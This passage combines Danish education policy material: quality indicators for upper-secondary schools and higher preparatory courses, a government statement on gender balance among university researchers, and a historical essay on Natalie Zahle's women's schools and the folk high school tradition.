they make an effort themselves. However, in order not to confuse requirements with what is offered, the school must show the students that their actions have positive and negative consequences. SIGNS OF QUALITY The School's Pedagogical Climate The instruction is characterized by high academic standards, and by teachers' and students' planning, carrying out and evaluating the instruction as a joint effort, for which they are all responsible. All teachers vary the format of the instruction to suit the requirements of the subject matter and the students' backgrounds. Written and oral work, data processing and other means of communication are employed in all subjects. Various activities take place outside the classroom as part of the instruction, e.g. field trips. The school's teachers co-operate within the subjects and across them: The instruction is co-ordinated in an attempt to further the students' understanding of unity and cohesion, strengthen their skills at expressing themselves and give them sound working habits. The teachers' diversity is made a fruitful part of the life of the school and is appreciated by the school's administration. P>Requirements and Consequences From the outset, students are aware that attend- ance is required and aware of the amount of work required in each subject. The school's teachers are in agreement as to the penalties that apply to insufficient preparation and poor motivation, and they employ them. The school informs students and parents about its policy on excessive absenteeism. At the same time the students are informed about the school's procedure, which clarifies the students' situation at an early stage in an open and honest manner. Written assignments are required to be given in at the time appointed; by the same token they are marked, commented on and returned quickly, i.e. as a rule within one week. Negligence about written assignments is quickly pointed out. An effort is made to help new students get used to the kind of academic standard, instructional format and general education that characterize work in the upper-secondary school and the higher preparatory courses. A Good Faculty Academics and educationalists At the start of their first year in an upper-secondary school or higher preparatory course, some students may find that their new teachers seem a bit distant and difficult to understand. However, at the same time the students appreciate having teachers with great academic knowledge and appreciate being treated as grown-up, responsible people. A good faculty finds an appropriate balance between distance and familiarity and delegates tasks in a way that utilizes the resources within it, which result from the make-up of the faculty as to gender and age, among other things. SIGNS OF QUALITY A Good Faculty A good faculty knows its strong and its less strong points and delegates tasks accordingly, in the distribution of subjects and planning the timetable, as well as in other areas. In academic, professional terms, a good faculty is characterized by exchanges of ideas and experience, by participation in pedagogical activities, and by the confident sharing of successes and disasters with colleagues. Social life among colleagues is characterized by helpfulness, a sense of humour, and good fellowship, in the individual departments as well as in the faculty as a whole. A Good Teacher A teacher's personality A teacher uses his/her entire personality when teaching, and the fundamental differences between teachers are probably related more to their different personalities than their different methods of teaching. It is a positive quality for students to encounter teachers who do their jobs in different ways and who are willing to give the students varying degrees of critical response. The purpose of the instruction is not, of course, to convince the students that the teacher's personal views are right; it is the subject matter that is central. But, for the teacher as well, it is a fact that the best instruction arises when the teacher is genuinely interested in what is being worked on. The objective communication of subject matter is no guarantee for good teaching, whereas all-round, open-minded discussions may be the key. As long as the inviolability of the students' private sphere is respected, the teacher must be able to act and react as the person he or she is, in the same way as the students each set their mark on the instruction. Academic qualifications are not in themselves sufficient for creating a good teacher. A teacher's instruction can be prepared by advice and guidance, and one can learn a certain pedagogical technique. But not everyone is cut out to be a good teacher for life. Teaching requires talent. Thus there are teachers who fail despite considerable academic knowledge. The Department's school visits have shown that students attach importance to the following (in the order given): - the teacher's personal characteristics - the teacher's academic proficiency - the teacher's pedagogical ingenuity and ability to vary the instruction - the teacher's preparation and completion of the individual lesson - the teacher's ability to incorporate the class's other subjects - the teacher's involvement (in non-academic matters as well) SIGNS OF QUALITY A Good Teacher * has good knowledge of the subject, is an enthusiastic communicator and is interested in the subject as well as its links to other subjects, * is involved with and attentive to students, even outside the classroom, * makes him/herself available along with his/her academic knowledge to the students, in ways such as stating his/her own points of view, without becoming unprofessional, * keeps going as a teacher by keeping up with the subjects, by staying informed on pedagogical questions that are particularly relevant to his/her subjects, and by participating in in-service training, * co-operates with colleagues on instruction in his/her subjects. In-Service Training for Teachers Subject-specific and pedagogical development Upper-secondary and higher preparatory teachers have an academic education that ensures that the instruction is of a high standard. As a result of their education they are able to keep up with developments in their own subjects and are able to acquaint themselves with related subject areas. The original degree course, along with the ensuing course in practical pedagogy, is the basis for teacher's entire career. But academic qualifications need to be maintained; this can be done in various ways. There are always short courses, and in connection with new subjects and subjects at new levels, in-service training is offered. A considerable portion of a teacher's working hours are spent getting acquainted with new subject matter, keeping up with a subject and preparing instruction. This division of working time means that a great deal is left to the individual teachers to attend to the subject-specific and pedagogical maintenance of their educations, for instance in a network of colleagues from other schools and at regional courses. In-service training courses The Ministry of Education normally subsidizes the following kinds of courses and meetings on subject-specific and pedagogical topics: Two- to three-day residential courses for colleagues from the whole country, at which a topic is dealt with from several points of view, alternating between presentations by people not on the course and contributions to discussion by the participants themselves. Regional one-day meetings. The teachers' organizations for a single subject may, for example, offer a series of meetings on a topic over the course of half a year. One-, two- or three- week residential courses or study trips abroad during a school holiday (usually in July and August), often paid for by the teacher to a great extent. It is valuable if the teachers' in-service training can be linked to some experimental project at their schools. SIGNS OF QUALITY In-Service Training In collaboration with the teachers, the principal has decided on the priorities for in-service training within the school's budget and set down principles for allocating funds. Consideration of the whole faculty's need for in-service training carries greater weight than the individual teacher's spontaneous wish to take a course. The school's administration ensures that funds for in-service training are spent as well as possible, for instance, by encouraging teachers who ordinarily would not apply for a course to do so. Teachers who have participated in residential courses, for instance, pass on their impressions and course material to colleagues. Suggestions for allocating funds for in-service training are made by the teachers, but the final decision as to who is given the funds is made by the principal as part of his/her responsibility for pedagogical leadership. A Good Class Even though the school divides new students to achieve a suitable distribution as regards gender and school background, classes can turn out surprisingly differently: everyone who teaches knows the concept of "good" and "bad" classes. A "bad" class can mean that the students will have a less satisfactory school experience than they might have had individually in another class. On the other hand a "good" class can help weak students along, students that might otherwise have dropped out. There is no reason to give up in advance on improving the attitudes towards work and the general atmosphere of a class. The teachers of a class can, together and with the support of the principal, identify the sources of a "bad" class's negative attitudes, speak to the individuals and make an agreement with the class on a change of behaviour. SIGNS OF QUALITY A Good Class The students accept one another's academic and personal differences. The class works happily as a whole, in groups or pairs, and has a well-developed, civilized way of talking with one another: many speak up, they listen to each other and are open to the arguments of teachers and fellow students. Students in the class take their opportunities to influence decision making seriously, choose a student council representative and use him or her as a link to the governing bodies of the school. In a good class a chance to work in peace and being in good spirits are not contradictory. A Good Student Interplay Successful instruction is based on interplay between interesting subject matter, an academically sound teacher and students who make an effort to acquire knowledge, are willing to present arguments for their points of view, and who take responsibility for their part of the educational and learning process. A good student is not synonymous with a proficient student, but rather with a student who wants to become more proficient. From a teacher's point of view, the student who always performs at top level is not a better student than one who makes perceptible progress from an average level. The double goals of the upper-secondary school and the higher preparatory course, i.e. education for further study as well as a general education, create a tension between subject and pedagogy, which makes it a great and satisfying challenge for most students to encounter the school's requirements and the social and academic activities it can offer. The instruction is carried out by teachers with a university degree. This means that the students rarely have the same teacher in more than one subject, and that they encounter more kinds of technical language and more abstract words than they have been accustomed to. In addition it is expected that the students will manage their preparation and their efforts themselves. This requires that the students take responsibility for making the instruction succeed. SIGNS OF QUALITY A Good Student * comes to school in good spirits and with an open mind and in prepared to make the best possible use of his/her academic and personal background, * adjusts his/her other duties (work, sports, etc.) to the requirements of the school - not the other way round, * makes demands of the teacher, * prepares and contributes to work in the lessons, * is able to become surprised and enthusiastic, * is independent and willing to present arguments for his/her points of view, * is on time and gives in written assignments at the time appointed, * takes a share of the responsibility for making work with the other students function properly, e.g. in group work. A Good Lesson Varied forms of instruction Good class instruction is characterized by lively dialogue. Starting with the students' own world, the dialogue on the subject matter evolves in such a way that customary ideas and new views become the object of debate - resulting in new perception. A candid and open-minded atmosphere in the class is important in making it possible for students to express themselves with confidence on subject-specific as well as general matters. "Chairing" the classroom dialogue, the teacher has a particular responsibility to create continuity, i.e. to ensure linkage back to previously achieved insight and ahead to the goals of the instruction. A good lesson can also be planned as experimental work, group work, alternation between class work and pair work, problem solving, etc. What is crucial is the intensity of what takes place and whether the format of the instruction is varied according to the type of subject matter, the students' background and the situation in general: It is vital that the teacher seizes a pedagogical opportunity now and then and deviates from the plan, by using a current event, for instance, as a starting point. SIGNS OF QUALITY A Good Lesson Work is done to a plan, which gives a broad outline of the instruction for a fairly long period and which is familiar to everyone. Class time is used efficiently and dynamically, without seeming to force the pace. There is an atmosphere of security in the class, and at the same time the teacher makes appropriately high demands of the students. The lesson is structured and conclusions are underlined so that the students know where they are in a given teaching unit. The purpose of an activity in a lesson is obvious to all students. In the instruction, formats that suit the subject matter are employed. The students are activated individually, in pairs or in larger groups so that in connection with projects, for example, they take part of the responsibility for the progress and the content of the instruction. All students, whether good, average or mediocre, receive assignments that suit their academic backgrounds and at the same time make new demands of them. The students' contributions to the instruction are taken seriously. The student receives recognition for competent, productive, correct contributions. Less satisfactory contributions from students receive a critical response or a clear, explanatory rebuttal. The conclusion of the lesson points ahead towards the next lesson, and the students clearly know what they have to prepare for the next time. SIGNS OF QUALITY Teaching Materials The school has drawn up a policy on how funds allocated for teaching materials are to be administered. A long-term plan is made for purchasing by departments and by the school as a whole. The departments' stock of books and other materials reflects primarily the weighting of the elements of the subject in the Executive Order on Subjects. The experimental equipment is versatile, accessible and in working order. The departments co-ordinate purchasing with each other and with the school library. Teaching materials are the subject of the principal's regular discussions with the departments on their long-term plan for purchasing and their criteria for purchasing. Information about newly acquired teaching materials is available to those interested. The school has a policy on photocopying: Consumption is kept under control, certain minimum requirements are made as to the legibility and general appearance of the copies. Assessment and Differentiation Differentiation of instruction Well-organized instruction offers the students challenges and introduces the subject at a reasonable pace. The interplay between the teacher and the various groups of students, and between the students themselves, can open up new perspectives that the individual student would not have seen otherwise. Individualized instruction, therefore, is not always the most expedient means of increasing what the individual student gets out of the instruction. The best thing is to make use of formats of instruction that allow the teacher as well as the individual student to make varied contributions to the joint work of a class: at times the teacher is the one who listens, and one or more students analyse, discuss or summarize. At times it is the other way round. Differentiation of instruction is not just the teacher using various teaching materials to drive each student consistently towards the degree of attainment that the teacher thinks the student capable of. Experimental work is well-suited to differentiating the instruction. Various students can attack an experimental problem in vastly different ways and with varying degrees of understanding. The school can support the individual student's planning and completing of written as well as oral homework so that demands are made that suit the various students' backgrounds. Students can work individually at home and at school with handbooks, computers or other aids. It is the teacher's job to contribute to what the individual student gets out of the instruction and to attaining the goals of the subject by constantly having differentiated material and topics ready. Marking and continuous assessment In the upper-secondary school and in the higher preparatory course, there is a long tradition of being interested in the external assessment of the student's knowledge and skills at the conclusion of the course of study. On the other hand, methods that make it possible for the students to measure and evaluate what they are getting out of their own learning process on a regular basis are less widespread. The same is true to a certain extent of students' and teachers' evaluation of the instruction. Systematic (self-) evaluation of instruction is not a widespread phenomenon, but it is gradually finding favour as a useful supplement to traditional marking. According to the regulations, students in the higher preparatory course and the upper-secondary school must be informed regularly about their level of attainment. In the same way, teachers are obliged to discuss the instruction with the students. In the upper-secondary school the student's level of attainment is expressed in a mark. It is up to the schools to decide how to put these regulations into practice. The marks that are given are absolute. This means that the students' level of attainment must not be assessed in relation to each other, but in relation to a number of fixed criteria for what one must achieve to get a given mark. With restrictions on intake in higher education, interest in marks has increased drastically, with a corresponding obligation on the part of teachers to be meticulous in their assessment: consult the Ministry's guidelines for external examiners, discuss assessment with colleagues in the department and give reasons for marks to each individual student. Meticulous and well-founded marking with colleagues' agreement on the criteria is also a good means of ensuring that students and parents understand and accept the marks that are given. SIGNS OF QUALITY Assessment and Differentiation The students' backgrounds are discussed and analysed regularly. The students' homework is organized so that the individual student sees a realistic connection between the demands of the subject, his/her own efforts and the teachers' assessment of the result. The school's departments have discussed the consequences of absolute marking and through discussing the guidelines for external examiners, exchanging scripts, assessing one another's mock exams, etc., have reached a consensus on marking. In addition to assignments for a whole class, students are occasionally given individual assignments (experimental, written or oral) with subsequent collective and individual guidance. The teacher, in collaboration with the students, sets up clear goals not just for the long term, but also for shorter teaching units, and parts of the subject content - in some cases perhaps for a single lesson. The instruction is discussed regularly by the teacher and the students so that both parties' responsibility for getting something out of it is clear. The teacher must also be able to allow his/her part of the effort to be evaluated by the students and be willing to discuss the choice of format for instruction, teaching materials and methods, etc., with them. Regular evaluation takes place in a secure atmosphere which has a purpose and according to a procedure previously agreed upon by the teacher and students. Coherence and Co-ordination Co-operation between subjects The content and the working methods of the individual subjects are the main thing in upper-secondary and higher preparatory education. However, one essential criterion for good general education is that the students do not always experience the subjects one at a time, but also have an opportunity to see the individual subjects as parts of a greater whole. The ideal is that the course of instruction, over two or three years respectively, constitutes a whole: The regulations for the upper-secondary school and for the higher preparatory course require that the instruction be organized so that the subjects support each other. Various kinds of co-operation between teachers can contribute to students' being better able to see the connections in the subject matter: common use of terminology and symbols in related subjects, studying the same topic in two subjects simultaneously, joint study of a theme and other forms of co-operation between subjects, e.g. concerning written and oral assignments or having teachers sit in on one another's lessons. The same is true of the teachers' co-operation on marking and assessment in subjects with written work. Instruction in the individual classes must be co-ordinated in order to ensure an appropriate distribution of the students' workload. Of course, there are often genuine practical difficulties involved in carrying out this kind of co-ordination, however, it can be done. For example, a plan is necessary for the giving in of students' written assignments, taking into account various other events at the school, in order for students and teachers to be able to put their work into perspective and to distribute it. SIGNS OF QUALITY Coherence and co-ordination A plan is drawn up for the giving in of written assignments for all classes. Instruction plans for the subjects of a class are available. At least once, each class has an experience of teachers of two or more subjects working together on the content of the instruction. Leadership and Co-operation Non-hierarchical schools It is characteristic of Danish schools that they are non-hierarchical institutions, in which only one person has the authority and the responsibility of leadership. This structure means that all employees, of necessity, have an obligation to take responsibility and tasks upon themselves that in schools in most other countries would be delegated to a kind of middle management with specific jobs and titles (e.g."head of department" or "senior teacher"). The principal is the central person at at a school by virtue of being responsible to the authorities (county and state), as well as to students and employees of the school. The principal prioritizes, delegates, co-operates and disseminates. With knowledge of the functions and resources of the school and by virtue of his/her personal credibility, he or she stands as the guarantee of the quality of the school. Thus, the principal has final responsibility for allocating teachers to subjects and classes, making use of subject-specific and pedagogical considerations, including the teachers' own wishes. The framework for instruction is set down by the Ministry of Education, and the school's economic framework is determined by the authority in charge of the school. Within these frameworks the school sets up its goals. It is the principal's job to ensure that they are clear to students and parents. Not simply as an avowed intention, but as daily practice that is supported by the school's employees. For this reason, among others, it is important for the principal to keep up with general discussions on society, culture and education and communicate new pedagogical thinking so that his or her own views are made apparent. SIGNS OF QUALITY The school's pedagogical leadership The principal delegates tasks in collaboration with the employees. The principal gives contact with the students a high priority. The principal sees it as a main task to create the right conditions for good instruction with coherent content and an appropriate co-ordination of the students' work. The principal keeps in touch with daily instruction, by sitting in on lessons and department meetings, for example. Students and employees have easy access to the principal, and he or she does not avoid conflicts when they are inevitable. The principal is able to pick up a teacher's personal or pedagogical problems at an early stage so that they do not become insoluble. The principal knows the teachers' qualifications, has respect for their professionalism and attempts to share out the funds available for in-service training in a way that gives all the teachers an opportunity to keep abreast of subject-specific and pedagogical developments. The principal supports experimental work in school subjects and in pedagogy and takes the initiative in faculty discussions of pedagogical topics. The principal takes part in discussions of all classes at teachers' assemblies, and in close co-operation with the student counsellors, he or she ensures that decisions concerning students' absenteeism and its consequences are made on a uniform basis. SIGNS OF QUALITY The School's Administrative Leadership A calendar exists which gives a survey of the year's administrative tasks, so that everyone knows all the important deadlines. The daily system for conveying notices works without problems. Notice-boards are kept up to date. There is a substitute system to cover lessons during in-service training, etc. Avoiding the cancellation of lessons is a high priority item. The principal makes a point of having good co-operation with office staff, caretakers and others employed as technical-administrative personnel. The principal shows that he/she appreciates an independent effort from these staff members. SIGNS OF QUALITY Councils and Assemblies The school's committee structure works efficiently, and it is evident where the responsibility rests. Discussions in the teachers' council are primarily concerned with general questions of importance for the school as a whole that have been prepared in sub-committees. The principal sees to it that student council members are informed each year of their rights and obligations on this advisory body. A meeting room is made available to the student council, the members are carefully informed about work in the teachers' council, among other things, and are helped in doing their job in other ways. SIGNS OF QUALITY Departments The school's departments have selected a representative who is responsible for the departmental budget, co-ordinates the purchasing of teaching materials for the department, works out suggestions for the distribution of subjects and lessons, etc. The representative calls regular departmental meetings on finance, reports from courses and meetings, presenting new acquisitions, discussions of the content of the subject and other subject-specific and pedagogical topics of current interest. Co-operation in the department can be characterized as a fellowship of colleagues that furthers the teachers' personal and subject-specific development - and possibly takes the form of genuine experimental work from time to time. The department helps new colleagues to settle in at the school. SIGNS OF QUALITY Education and Careers Counselling The school counsellors have produced a leaflet for all new students. The leaflet contains information about the counselling that is given, and about where and when the counsellors may be seen. The counsellors' office hours are suitable for the students and possibly others (e.g. those outside the institution who are involved). Depending on the needs of the individual institution, student councelling is offered at fixed hours throughout the week. The purpose of counselling on the choice of subjects, education and careers is to enable the students to make their own decisions on an objective and neutral basis. The counsellors give information about possible consequences of a student's choices, e.g. if the student applies for admission to higher education. Counsellors represent various departments (natural sciences, social studies and humanities). There are counsellors of both sexes at the school. The counsellors work well together with each other and with the other teachers at the school. The counsellors hold regular meetings with the school administration and leadership. The counsellors have contacts with other educational institutions, with local public authorities and businesses in the area. The counselling office is centrally located and well-equipped with informational material (printed material, computer programs and videos). The students have access to this material in preparation for interviews with the counsellors about their choice of education and career. The Physical Setting The standard of the buildings used by upper-secondary schools and higher preparatory courses in Denmark varies a great deal. One cannot reach any conclusions as to the educational quality of an institution based simply on the age of the building, its maintenance or decoration. Excellent instruction can take place, for example, in buildings that still bear the mark of decades of poor funding for maintenance, or in those built for an entirely different purpose. Many of the Danish upper-secondary schools that have been built in the last thirty years are some of the best architecture of the period, and they are decorated with sculptures and paintings that few other places of work can equal. These buildings, their aesthetic and equipment are an expression of the importance the local community has attached to schools and education during the period. The setting does not in itself guarantee the quality of what takes place in the building, of course, but the physical setting can show symptoms of possible problems at the school. Untidiness in a classroom, for example, or a store-room or a notice-board that has not been kept up to date can indicate that the distribution of responsibility is vague in other areas of the schools as well. SIGNS OF QUALITY The Physical Setting There are clear signs to help new students and visitors. The school is decorated - the students art work is included. The school's classrooms, special-subject rooms and laboratories are kept clean and tidy. There is a long-term plan for the maintenance of the buildings and grounds. The school has a policy on tidying up, graffiti, smoking, alcohol, etc., that everyone helps to achieve compliance with. The formal basis of the Upper-Secondary School and the Higher Preparatory Course is found in: Executive Order no. 296 of 7 May 1991, as amended by Executive Order no. 554 of 16 July 1991, on Higher Preparatory Courses and on Single-Subject Courses Preparatory to Further Studies.

One of the most important development trends since World War Two has been women�s entry into the labour market, as well as the education system. Shift in career choice Particularly in recent years women have entered upon new educational and occupational areas which were previously almost exclusively dominated by men. The traditional norms governing education and career choice are undergoing significant changes as a result of, among other things, information campaigns and media coverage. Focus area: Scientific staff Following this development, the Danish government is focusing on the importance of a more even gender distribution among the scientific staff at universities and other higher education institutions. A researcher recruitment study from 1993 has shown that there is at present an uneven gender distribution among researchers, and that the proportion of women is lower, the higher they get in the hierarchy. Thus in 1991 women made up 24%, 17% and 4%, respectively, of the staff at assistant professor, associate professor and full professor level. The picture is changing - but slowly Development towards a more even gender distribution has been moderate. There may be several explanations of this. The former recruitment basis, for instance, was much more uneven than is the case today. As late as in the mid-80s, two thirds of the graduates were men. Today the picture has changed; in 1991, at 14 out of 19 major higher education institutions women made up 50% or more of the students in 1991. This implies that the future recruitment basis for appointments for scientific posts will to a greater extent consist of women. An increasing number of women researchers have found employment in the 1980s financed by external research funds, by research programmes, or in research centres. Increasing number of PhD students Researcher education plays an important role for a more even recruitment. This has had a favourable influence on the proportion of women among PhD students, which has been increasing rapidly in recent years. The fact is that the proportion of women who are annually awarded the PhD degree has increased significantly over the past 5 to 6 years. Today, approximately one third of the PhD students are women; however, there are great variations between the fields of study. Thus, there is a positive development towards a more even gender distribution among the scientific staff, the qualification requirement for a scientific post being a PhD degree or an equivalent qualification. But renewal of the permanent posts is taking place at a very slow rate. Shortage of new professorships Add to this that throughout the 1970s and 1980s appropriations for the higher education sector have been curbed. This fact, which has led to a shortage of vacancies, is one of the most significant reasons for the slow development. This has in particular manifested itself in the area of full professorships, where for a number of years hardly any vacant jobs have been advertised; this is precisely the area where we have the most uneven gender distribution. Research Policy Council�s recommendations With a view to acquiring a more even gender distribution among the scientific staff at the higher education institutions, the Danish Research Policy Council, which is an advisory body to the Danish Government on research matters, has among other things recommended the following: A goal-oriented effort should be made in order to increase the proportion of women researchers at the higher education institutions. It is largely the responsibility of the institutions, when appointing new staff, to make conscious endeavours to create a more even gender distribution - upon open competition between men and women. Emphasis should be laid on measures that can stimulate and ensure continuation of the positive development. The crucial criterion for the appointment of new researchers should be the quality of their research. Quota systems and positive discrimination of selected groups of applicants do not form the course to be chosen. Vacancies must be advertised widely and filled with the candidates who have the best qualifications - upon fair competition between men and women. It is also of crucial importance to the furthering of a more even gender distribution that women�s interest in research and in a career as a researcher is encouraged - particularly within areas where women have so far been underrepresented, in particular within the fields of technology and the natural sciences. Government initiatives In order to further support the positive development towards a more even gender distribution, the Danish government has initiated various actions. Examples worth mentioning are: a significant enlargement of the important PhD scholarship programme (by 600 over a number of years), an increase in the number of professorships, and last but not least, favourable provisions regarding pregnancy leave, of up to 1 year�s duration for women PhD students. All things considered, conditions have been established for a more even gender distribution among the scientific staff at the higher education institutions. The Danish government intends to follow this development very closely. But we must realise that changes will only take place gradually over a number of years.

This poem precisely expresses some of the demands made on women in nineteenth-century Denmark: the cardinal feminine virtues were calm, restraint, tenderness towards others and modesty about oneself. The strange thing about the poem is that it was written in the mid-1850s by the woman who, more than any other individual, was to influence the potential of Danish women to educate themselves, to win freedom of choice, and to develop into strong, dynamic women. It was the educationalist Natalie Zahle (1827-1913) who wrote it. It was she who, fifty years later, had sent the first generations of women pioneers out from her women�s schools into political, professional and teaching careers of all kinds; out into offices and positions where they worked, competed and expressed themselves on an equal footing with men. Women in Nineteenth-Century Denmark One must of course wonder at this paradox: how could generations of girls be brought up with Victorian ideals and still become independent, inquiring, freedom-loving women? There are several reasons. They all help us to understand why in the last 150 years Danish women have had so many opportunities for education and have been left relatively free to choose. Growth of intellectual and spiritual freedom The influence of the European revolutions and liberation movements was strong. The nationalist feeling - called �the spirit of 48� - that had grown out of Denmark�s war in Schleswig-Holstein in 1848-51, also captured the imaginations of women. The women were the young daughters of churchmen, civil servants and independent farmers, from homes where there was a preoccupation with the building of the new society that began to blossom with the country�s first great parliamentary constitution of 1849. The homes were no longer able to keep these daughters - and the daughters for their part were not particularly interested in just waiting to be kept in a marriage. They thirsted for knowledge and skills, and longed to take part in the first growth of intellectual and spiritual freedom that the young democracy of the country had given its sons. No education for women On the other hand, there was at this time no education for girls or women over the age of fourteen. There were a few �daughters� schools� and finishing schools which unsystematically, and oriented towards the daughters of the languishing higher aristocracy, gave their pupils an aesthetic education, with the aim of turning them into the �gardeners of domestic life� - or the chorus of a Greek tragedy, as the famous Danish actor and dramatist couple the Heibergs put it. The wish to play an active role Against this a wish arose for the daughters of the country to play an active role in the formation of the family, the state and the nation. They were to learn to be useful to their country - first and foremost for the sake of the country; later for the sake of the family and of their role as mothers and educators of coming generations. And early - as early as the beginning of the 1870s - the first calls came for the daughters to be educated and brought up as whole human beings on an equal footing with the sons of the country for their own sake. The old culture - and a new ideal But irrespective of whose sake it was for, the women themselves were part of the old culture and did not really wish to break with it. They wanted to build on it, reform it and develop it into a culture that opened up to the feminine as something nourishing and useful, and gave both sexes access to knowledge, careers and influence. For these reasons even the feminists and pioneering educationalists could live with the fact that the educational journals, newspapers and the public in general expressed a Victorian female ideal, while the women themselves in practice broke with this and shaped their own gender-transcending ideal; an ideal that gave women the right to privileges and qualities that had hitherto been reserved for men. The private girls� schools and the unified schools Whereas the state and the authorities left the confirmation-age girls and their families to their own devices, younger women went to work building up real schools on their own, private initiative. These energetic women�s struggle for education, their desire for access to politics and careers, accorded well with their demand for intellectual freedom. But those who took part in public debate and mobilized other women in this direction had little success with their schools. This was true, for example, of Pauline Worm, Athalia Schwarz and Mathilde Fibiger. The parents did not dare send their daughters to the schools of such emancipated women. The pragmatic strategy But what happened now was that other progressive women of this generation acted, but stayed silent in the debate. Pragmatically, systematically and deliberately, they began to build up schools: preparatory schools, primary schools, higher girls� schools, teacher training schools for women. They knew that in public they must speak with the tongues of the age, but at the same time that they could act against and beyond the tendencies of the time. That is why the verses quoted above urge quietness and restraint. Not because they were meant to deceive the girls, but because they had to express the notion of a feminine and religious educational culture; they said nothing - not out loud at least - about the general human, male education that required ambition, initiative and the ability to act, and for which the pioneering educationalists wanted to prepare the young girls and women. But they seem to have thought that it should be developed in practice. At all events this pragmatic strategy was a great success. The leading figure behind it was Natalie Zahle. The unified school Over half a century, a unified school grew up out of the joint efforts and experiments of the pioneering educationalists. As a system that had been tried out in practice, this unified school formed the model for a new Danish general education act of 1903, which was to apply henceforth to the state schools and to both sexes. Thus it was that the activities of the pioneering women, in which they engaged without intervention or financial support from the state, became the foundation of the whole Danish public education tradition. The unified school mapped out the pupil�s path from the preparatory school at age 6-7, through primary school until confirmation age, and on to the almost-adult pupil�s range of options in a number of higher education courses. This was a radical break with the schools and educations (for boys) of the old society, which were based on smaller, sexually segregated schools for the children, where they were in two classes from 7 to 14, after which the boys could be admitted to the military, grammar or teacher training schools. In content, too, the unified school was different from the old schools. The aim was first and foremost learning for life, a general human education, and for the girls a formative feminine education too. Then came the teaching of basic skills with the introduction of classes in Danish and history as part of the national education. The school was to be based on the national religion, on Christianity, but was to be flexible enough to relate to, discuss and accept other religions. Thus it also had a place for pupils from Jewish, Muslim and atheist homes. Foundation of the Danish public education tradition The pedagogical experiments that were tried in the latter half of the nineteenth century consolidated the unified school with those traditions that have typified the Danish educational system ever since. A systematic syllabus In the first place, a systematic syllabus was introduced, with the Danish language and history as the basic, general subjects, and otherwise with a phased curriculum of foreign languages, current affairs, geography, religion and science, as well as the special women�s subjects: handwork, household economy and human biology. Grades Secondly, the system of one-year �classes� or grades was introduced: nine grades from the preparatory grade to the eighth grade, i.e. a new grade every year for the children from age 6 until 15. The experience gained from this made its impact in the act of 1899, in which it was stipulated that the pupils in the Danish state schools would be categorized �by age, progress and maturity�. Teaching practice Thirdly, the code words were �thoroughness� and �industry� on the one hand, and �cheerful, free dialogue� on the other. This expressed the fact that methodical, disciplined teaching in the elementary skills went hand in hand with a free, lively, narrative-style teaching practice in the general-subject and moral areas. The class as a basic unit Fourthly, the idea of the school as a home, and of the �class mother� who functioned as the pupil�s social mother in the school, was consolidated. The idea was inspired on the one hand by the German educationalist J.H. Pestalozzi (1746-1827) and by the ideological founder of the Danish �folk high school� N.F.S. Grundtvig (1783-1872) and on the other by the female teachers� own experience. Natalie Zahle trained her teachers as mentors beside their role as subject teachers. As the mother was the central figure in the home, the �class mother� was to be the unifying �soul� of the class. As the home was the safe foundation of society, the class was to be the basic unit in the larger school. The dual qualification of women The aim was the �utilitarian� educational ideal. This meant that both the education and upbringing of the daughters were seen as important elements in the struggle for the emancipation of women, understood as the widening of the opportunities of women in society. What the educationalists had in mind was a dual qualification of women; development of understanding and skills, and the formation of personal character were the areas in which the daughters were given the chance to enhance their potential. A consious choice between marriage and career At the same time the virtues of motherhood formed a core in the education of women. Domesticity, caring and the understanding of the economy, functions and aesthetics of the home formed a central foundation for the education of the girls, irrespective of how they might want to organize their later lives. They were to be able to make a conscious choice between marriage and their own career, in the sense that they would not have to marry to be provided for. Just as there were many small schools all over the country, there were to be small schools within the system of each larger school: first the preparatory school, then the one-year grades in the primary school, and later again a range of opportunities to continue in different schools such as specialized schools, grammar schools, higher girls� schools, teacher training or the free folk high school. From pioneering schools to State school system It is worth emphasizing here that many of the pioneering educationalists� schools, in the course of the first few decades of the twentieth century - and in some cases later - became state schools admitting both sexes. On the whole, the ideas and experiments that were developed in these schools at the end of the nineteenth century became a matter of course in the Danish state schools system, as well as in many private schools and folk high schools. The Danish folk high school The principal figures in the building-up of the Danish girls� and women�s schools were strongly influenced by the folk high school idea. Denmark�s first folk high school opened in 1844, and on that occasion one of the things the principal said was: The hearts of the young must be infused with love of their country, its language, its history, its customs, its manners and institutions; such however that they are made aware of their nation�s failings as well as its virtues. Without this, learning is a curse... National identity Now, at the end of the twentieth century, we may wonder at all this talk of and emphasis on love of country and the nation. Throughout the twentieth century we have had so many gruesome examples of what extreme nationalism can lead to. But in the Europe of the nineteenth century the situation was quite different. Each nation was trying to find its own national identity. In Denmark the very expression of Danishness was by no means a matter of course. It was something that had to be fought for in a confrontation with the German-influenced public sector culture. Humanity and religion The ideological founder of the Danish folk high school, N.F.S. Grundtvig, had certain notions, quite revolutionary for his time, about humanity and religion. For him the core of the matter was being human and living a human life in one�s own country and with one�s own people. It was quite new for a Christian to be able to regard life on earth and in one�s own country as the most important thing: Christianity and faith were there for the sake of earthly life, rather than the other way round. This attitude also revolutionized the relationship between the view of life and the view of knowledge in the broadest sense. Mankind was made in the image of God. But it was the task of the church, not of the school, to promote Christianity and faith. The school on the other hand could agree with any human being �who becomes conscious of his spiritual nature�, whether a Christian or a heathen, a Turk or a Jew. For such people need to seek truth through both clarity and the inexplicable. The School for life There was thus a need for a popular �science�, popular education and information. There was a need for a school for the home and a home for the school. So the Grundtvigians too worked with the idea of the school as a kind of home. In this case in the sense that it was the school for life. The school was to become an informative, enlightening institution beneficial to life, where not information as such but the requirements of life were the real aim. The soul or principal object of the folk high school had to be �the popular�, �the communal� and �the general�. The objective was not to be a career education or a degree, although it was useful to learn a foreign language, mathematics, history and other subjects. Cultivation and information were to be their own reward. The aim of the high school, according to Grundtvig, was to make the pupils �fit for life�. This credo, which has been behind every folk high school that has seen the light of day in Denmark since, irrespective of ideological or religious standpoint otherwise, has given the folk high school as such the potential to adapt to society at any time. Know yourself, your time and your people Since Grundtvig�s day, Denmark has seen Grundtvigian, Evangelical, Socialist, Social Democrat, feminist, ecological, international and a wealth of other high schools come to life, survive - and change. The common factor has been that enlightenment and the shaping of knowledge have been important activities, but not the most important. The most important thing was and is that the folk high school gave people the opportunity to learn to know themselves, their time and their people. Students' benefits A study has been made of how pupils at the Danish folk high schools have benefited from their stay at the high schools today. Some quotations may illustrate this: �I have opened up more to various types of people, people who are different from myself, and I have fewer prejudices.� �I have gained greater understanding of foreigners and refugees.� �The high school is a breathing-space in life. It is life-affirming to be here - you wake up and blossom. You get a lot of new ideas to work with, and you gain friends and experiences to build on.� �What is so impressive about the high schools is that people often come for a �negative� reason like unemployment, a sense of emptiness, uncertainty and the like - and then blossom and grow and develop.� 